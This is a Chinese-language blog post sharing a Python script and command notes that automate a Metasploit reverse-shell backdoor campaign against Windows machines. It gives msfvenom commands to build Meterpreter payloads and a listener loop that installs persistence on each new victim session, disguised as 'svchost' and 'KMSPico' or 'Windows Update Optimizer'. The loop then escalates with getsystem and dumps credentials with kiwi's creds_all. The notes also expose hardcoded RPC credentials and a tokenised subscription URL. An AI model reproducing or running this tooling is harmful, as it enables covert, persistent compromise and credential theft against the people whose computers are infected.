---
tags: [Metasploit, 网络安全]
title: 为 Metasploit 的后门内置 persistence
last_modified_at: 2023-11-10
slug: metasploit-auto-persistence
redirect_from: 
  - /posts/为Metasploit的后门内置persistence
---

## 新版

重构后的项目位于[Young-Lord/msf-remote-logger](https://github.com/Young-Lord/msf-remote-logger)，直接用这个就可以了。（开源协议：`AGPL-3.0`）

## 前言

依旧是一篇名不副实的博文。说到底是跑了个Python监听服务器，然后自动处理连接过来的session。

代码很烂，但<del>又不是不能用</del>。基于`WTFPL`协议共享。

## 正文

```python
# pip install tendo pymetasploit3
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.13.106 LPORT=7787 --platform Windows -f exe > b.exe
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.13.106 LPORT=7788 -a x86 --platform Windows -f exe > b2.exe
import os
import time
#import portalocker
import traceback

print_orig = print
 
# https://www.cnblogs.com/lsdb/p/12102418.html
class LockSingle():
    fd = None
    def _get_lock(self):
        file_name = os.path.basename(__file__)
        # linux等平台依然使用标准的/var/run，其他nt等平台使用当前目录
        if os.name == "posix":
            lock_file_name = f"/var/run/{file_name}.pid"
        else:
            lock_file_name = os.path.join(os.path.dirname(__file__), f"{file_name}.pid")
        self.fd = open(lock_file_name, "w")
        try:
            portalocker.lock(self.fd, portalocker.LOCK_EX | portalocker.LOCK_NB)
            # 将当前进程号写入文件
            # 如果获取不到锁上一步就已经异常了，所以不用担心覆盖
#            self.fd.writelines(str(os.getpid()))
            # 写入的数据太少，默认会先被放在缓冲区，我们强制同步写入到文件
            self.fd.flush()
        except:
            print(f"{file_name} have another instance running.")
            exit(1)
 
    def __init__(self):
        self._get_lock()
    
    # 和fcntl有点区别，portalocker释放锁直接有unlock()方法
    # 还是一样，其实并不需要在最后自己主动释放锁
    def __del__(self):
        if self.fd is not None:
            portalocker.unlock(self.fd)
    
    def aprint(self, *arg, **kwarg):
        print_orig(*arg, **kwarg)
        print_orig(*arg, **kwarg, file=self.fd)
        self.fd.flush()
        return
#print = obj.aprint
        
from tendo import singleton
me = singleton.SingleInstance() # will sys.exit(-1) if other instance is running
f3212312= open("log.txt", "a")
def print(*arg, **kwarg):
    global f3212312
    print_orig(*arg, **kwarg)
    print_orig(*arg, **kwarg, file = f3212312)
    f3212312.flush()


import subprocess
from pymetasploit3.msfrpc import MsfRpcClient
subprocess.Popen('msfrpcd -U u8edh1289hwqwd -P k2ffUE912hjesqw -f -p 61529', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
# msfrpcd -U u8edh1289hwqwd -P k2ffUE912hjesqw -f -p 61529
print("waiting for msfrpcd...")
time.sleep(20)
print("connecting...")
client = MsfRpcClient('k2ffUE912hjesqw', ssl=True, username='u8edh1289hwqwd', server='192.168.13.106', port=61529)
execed = []
print("connected.")

cid = client.consoles.console()
s1 = """handler -H 192.168.13.106 -P 7787 -p windows/x64/meterpreter/reverse_tcp
handler -H 192.168.13.106 -P 7788 -p windows/meterpreter/reverse_tcp"""
cid.write(s1)
# print(cid.read()['data'])

#s1 = client.sessions.list
#print(s1)

def exit_sess(session_id):
    print(f"exiting {session_id}...")
    s="""
sessions -k {}
""".format(session_id)
    cid.write(s);
    ret = ''
    cnt = 0
    while True:
        cnt+=1
        if cnt>=30:
            print('cannot wait for busy when exit.')
            print(ret)
            return ret
        r = cid.read()
        time.sleep(0.2)
        ret = ret+r['data']
        if not r['busy']:
            print("fin.")
            print(ret)
            return ret

    

def persist(session_id, sess):
    print(f"persisting {sess}...")
    if sess['via_exploit']!='exploit/multi/handler' or sess['desc'] != 'Meterpreter' or sess['platform'] != 'windows' or (sess['arch'] not in ('x64', 'x86')):
        print("error checking:", session_id, sess)
        return False
    if sess['arch'] == 'x64':
        platform_spec = """
set payload windows/x64/meterpreter/reverse_tcp
set lport 7777
"""
    else:
        platform_spec = """
set payload windows/meterpreter/reverse_tcp
set lport 7778
"""
    s="""
use exploit/windows/local/persistence
set lhost 192.168.13.106
set EXE_NAME svchost
set VBS_NAME KMSPico Server
set REG_NAME KMSPico Server
"""+platform_spec+"""
set delay 600
set session {}
set STARTUP SYSTEM
run
sessions -C "getsystem"
sessions -C "load kiwi"
sessions -C "creds_all"
    """.format(session_id)
    # set payload windows/meterpreter/reverse_tcp
    # set lport 7778
    cid.write(s);
    ret = ''
    cnt = 0
    while True:
        cnt+=1
        if cnt>=40:
            print('cannot wait for busy when exit.')
            print(ret)
            return ret
        r = cid.read()
        time.sleep(0.2)
        ret = ret+r['data']
        if not r['busy']:
            print("fin.")
            print(ret)
            exit_sess(session_id)
            return ret

while True:
    try:
        for k, v in client.sessions.list.items():
            try:
                rmt = v['tunnel_peer'].split(':')[0]
            except Exception as e:
                print("rmt parsing error:", e)
                rmt = v['tunnel_peer']
            if rmt not in execed:
    #            print("new!", v)
                execed.append(rmt)
                persist(k, v)
            else:
                print("sess already persisted, disconnect", v)
                exit_sess(k)
    #    print('sleep...')
        time.sleep(6)
    except Exception as e:
        print(traceback.format_exc())
        f3212312.close()
        exit()

'''
exploit64 = client.modules.use('exploit', 'exploit/multi/handler')
# exploit64.options
payload64 = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
payload64['LHOST']='192.168.13.106'
payload64['LPORT']='7777'
exploit64.execute(payload=payload64)

exploit32 = client.modules.use('exploit', 'exploit/multi/handler')
payload32 = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
payload32['LHOST']='192.168.13.106'
payload32['LPORT']='7778'
exploit32.execute(payload=payload32)
'''
```

## 一些别的记录

```plaintext
msfrpcd -U u8edh1289hwqwd -P k2ffUE912hjesqw -f -p 61529

msf:
use windows/x64/shell/reverse_tcp
set lhost 192.168.13.106
set lport 7789
generate -f asp -o o.asp
generate -f msi -o o.msi
generate -f exe -o o.exe
generate -f vbs -o o.vbs


handler -H 192.168.13.106 -P 7777 -p windows/x64/meterpreter/reverse_tcp
handler -H 192.168.13.106 -P 7778 -p windows/meterpreter/reverse_tcp
handler -H 192.168.13.106 -P 7789 -p windows/x64/shell/reverse_tcp
handler -H 192.168.13.106 -P 7891 -p windows/shell/reverse_tcp

use exploit/windows/local/persistence
set lhost 192.168.13.106
set EXE_NAME svchost
set VBS_NAME KMSPico
set REG_NAME KMSPico
set payload windows/x64/meterpreter/reverse_tcp
set lport 7777
# set payload windows/meterpreter/reverse_tcp
# set lport 7778
set SERVICE_NAME "Windows Update Optimizer"
set SERVICE_DESCRIPTION "Optimize Windows Update."
set RETRY_TIME 600 # 每次重连间隔
set delay 600 # 登录后等待时间
set session 3 # 这里改成你获得的session
run


msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.13.106 LPORT=7777 --platform Windows -f exe > s.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.13.106 LPORT=7778 -a x86 --platform Windows -f exe > s2.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.13.106 LPORT=7787 --platform Windows -f exe > b.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.13.106 LPORT=7788 -a x86 --platform Windows -f exe > b2.exe


persist64 = client.modules.use('exploit', 'windows/local/persistence')
#persist64['LHOST']='192.168.13.106'
#persist64['LPORT']='7777'
persist64['EXE_NAME']='svchost'
persist64['VBS_NAME']='KMSPico Server'
persist64['REG_NAME']='KMSPico Server'
persist64['DELAY']=600
persist64['SESSION']=11
persist64['STARTUP']='SYSTEM'
persist64.execute(payload=payload64)
exploit32 = client.modules.use('exploit', 'exploit/multi/handler')
ppayload64 = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
ppayload64['LHOST']='192.168.13.106'
ppayload64['LPORT']='7777'



use exploit/windows/local/persistence
set lhost 192.168.13.106
set EXE_NAME svchost
set VBS_NAME KMSPico Server
set REG_NAME KMSPico Server
set payload windows/x64/meterpreter/reverse_tcp
set lport 7777
# set payload windows/meterpreter/reverse_tcp
# set lport 7778
set delay 600
set session 6
set STARTUP SYSTEM
run

https://v1.efshop.cc/api/v1/client/subscribe?token=252efe91bcb50b5f08a3aae300b61de3


msfrpcd -U u8edh1289hwqwd -P k2ffUE912hjesqw -f -p 61529

from pymetasploit3.msfrpc import MsfRpcClient
client = MsfRpcClient('k2ffUE912hjesqw', ssl=True, username='u8edh1289hwqwd', server='192.168.13.106', port=61529)
'''
exploit64 = client.modules.use('exploit', 'exploit/multi/handler')
# exploit64.options
payload64 = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
payload64['LHOST']='192.168.13.106'
payload64['LPORT']='7777'
exploit64.execute(payload=payload64)

exploit32 = client.modules.use('exploit', 'exploit/multi/handler')
payload32 = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
payload32['LHOST']='192.168.13.106'
payload32['LPORT']='7778'
exploit32.execute(payload=payload32)
'''

cid = client.consoles.console()
s1 = """handler -H 192.168.13.106 -P 7777 -p windows/x64/meterpreter/reverse_tcp
handler -H 192.168.13.106 -P 7778 -p windows/meterpreter/reverse_tcp"""
cid.write(s1)
print(cid.read()['data'])

client.sessions.list



s="""
use exploit/windows/local/persistence
set lhost 192.168.13.106
set EXE_NAME svchost
set VBS_NAME KMSPico Server
set REG_NAME KMSPico Server
set payload windows/x64/meterpreter/reverse_tcp
set lport 7777
# set payload windows/meterpreter/reverse_tcp
# set lport 7778
set delay 600
set session 13
set STARTUP SYSTEM
run
"""
cid.write(s); print(cid.read()['data'])
```
